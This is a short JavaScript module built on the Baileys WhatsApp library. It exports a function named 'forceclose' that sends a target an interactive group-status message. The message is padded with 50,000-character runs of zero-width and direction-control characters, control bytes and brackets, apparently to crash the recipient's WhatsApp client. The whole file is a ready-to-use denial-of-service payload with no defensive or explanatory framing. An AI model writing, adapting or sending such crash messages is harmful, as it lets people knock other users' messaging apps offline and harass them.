import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
async function forceclose(sock, target) {
const N = 50000;
const nanX = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
bloksWidget: {
fallback: "\u200D".repeat(N),
type: "\u200F".repeat(N),
data: "\[".repeat(N),
uuid: "\u200B".repeat(N),
},
subtitle: "\u0010".repeat(N),
title: "X".repeat(N),
},
nativeFlowMessage: { buttons: [{}] },
body: { text: "\u000F" },
},
},
},
};

const msg = generateWAMessageFromContent(target, nanX, {});

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id, 
noSelfSync: true,
});
}


export { forceclose };